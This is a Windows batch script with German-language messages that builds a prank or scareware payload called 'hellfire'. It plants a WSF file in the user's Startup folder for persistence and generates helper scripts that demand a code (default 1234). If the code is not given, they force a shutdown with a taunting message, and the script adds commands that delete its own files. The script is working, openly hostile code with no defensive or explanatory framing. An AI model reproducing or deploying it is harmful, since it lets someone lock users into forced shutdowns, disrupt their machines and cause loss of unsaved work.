
REM set /p ceta=<conf/wsfname.txt
REM echo %ceta%
REM pause
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf" >nul
REM del "conf\wsfname.txt"
REM set /p wsfnew=<conf/wsfname_new.txt
REM echo %wsfnew%
REM pause

echo ^<package^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^<job id="vbs"^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^<script language="VBScript"^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo set WshShell = WScript.CreateObject("WScript.Shell") >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
set /p zeit=<conf/zeitinmillisekunden.cfg
echo WScript.Sleep %zeit% >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo Set var2 = CreateObject("WScript.Shell") >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo var2.run "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</script^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</job^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
echo ^</package^> >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf"
set /p nachricht=<conf/nachricht.cfg
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
set /p reakz=<conf/reaktionszeit.cfg
echo @echo off >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo del idiot.txt >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo echo nulll ^>^> idiot.txt >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo call "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo set /p dau=^<idiot.txt >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo if %%dau%%==Nein exit >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo shutdown -s -f -t %reakz% -c "Selbst schuld, Sie haben die Warnung nicht beachtet. Sie haben noch %reakz% Sekunden." >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo @echo off >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo echo Achtung! NICHT UEBER DAS ROTE X SCHLIESSEN! >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo echo Bitte geben sie den Code (standardmaessig 1234) ein, um einen Absturz zu verhindern. >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo set /p code= >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\idiot.txt" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo if %%code%%==1234 ( >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo echo Nein ^>^> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\idiot.txt" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo exit >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo ) >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo echo Ja ^>^> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\idiot.txt" >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hellfire.wsf" /s /q >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfiredau.cmd" /s /q >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
echo del "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd" /s /q >> "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\hellfire.cmd"
pause